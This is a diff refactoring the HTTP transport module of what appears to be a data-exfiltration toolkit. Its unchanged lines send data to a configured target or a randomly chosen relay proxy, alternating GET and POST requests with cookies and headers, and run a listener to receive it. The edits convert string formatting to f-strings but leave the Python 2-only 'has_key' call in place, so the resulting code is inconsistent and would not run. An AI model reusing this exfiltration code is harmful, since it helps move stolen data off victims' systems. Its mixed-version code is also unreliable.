@@ -45,7 +45,6 @@ class S(BaseHTTPRequestHandler):
                 self.server.handler(data)
             except Exception as e:
                 print(e)
-                pass
 
     def do_GET(self):
         try:
@@ -67,14 +66,13 @@ class S(BaseHTTPRequestHandler):
                     self.server.handler(data)
                 except Exception as e:
                     print(e)
-                    pass
 
 def send(data):
     if config.has_key('proxies') and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
-    	target = "http://{}:{}".format(choice(targets), config['port'])
+        target = f"http://{choice(targets)}:{config['port']}"
     else:
-    	target = "http://{}:{}".format(config['target'], config['port'])
+        target = f"http://{config['target']}:{config['port']}"
     app_exfiltrate.log_message(
         'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
     #Randomly choose between GET and POST
@@ -86,7 +84,7 @@ def send(data):
         requests.get(target, cookies=cookies, headers=headers)
 
 def relay_http_request(data):
-    target = "http://{}:{}".format(config['target'], config['port'])
+    target = f"http://{config['target']}:{config['port']}"
     app_exfiltrate.log_message(
         'info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
     #Randomly choose between GET and POST
@@ -105,7 +103,9 @@ def server(data_handler):
         httpd.serve_forever()
     except:
         app_exfiltrate.log_message(
-            'warning', "[http] Couldn't bind http daemon on port {}".format(config['port']))
+            'warning',
+            f"[http] Couldn't bind http daemon on port {config['port']}",
+        )
 
 def listen():
     app_exfiltrate.log_message('info', "[http] Starting httpd...")
